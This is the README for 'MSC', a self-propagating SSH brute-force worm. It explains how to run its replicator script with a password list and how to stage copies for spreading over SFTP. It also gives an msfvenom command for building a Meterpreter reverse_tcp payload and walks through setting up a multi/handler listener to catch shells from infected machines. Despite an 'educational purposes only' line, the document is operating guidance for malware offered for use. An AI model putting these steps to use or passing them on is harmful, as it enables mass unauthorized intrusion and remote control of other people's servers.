MSC (Major SSH Crisis)
FOR EDUCATIONAL PURPOSES ONLY!

Welcome to the SSH brute force worm MSC! Make sure to review code and make neccessary changes to your needs.

Example command to run the script:
python3 replicator.py passwords.txt

As well, inspect the code and make sure scripts (or copies) are located in a /tmp/worm/ directory so the SFTP exchange is successful.

To execute a reverse shell payload, make sure the payload or a copy of the payload is in the /tmp/worm directory. In replicator.py, our example payload is "gotcha".
To create a payload use the following command:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f elf > file_name.elf

Finally, to catch reverse shells executed by the worm, make sure to run a msfconsole meterpreter. Use exploit/multi/handler, set payload to linux/x86/meterpreter/reverse_tcp, 
set LHOST and LPORT, and set ExitOnSession to false. When you are ready to listen for incoming connections, use exploit -j from the module command line, use sessions command 
to navigate multiple sessions. Sessions -h for help! When exiting a shell, use the command background from the meterpreter line so the session is not terminated. 
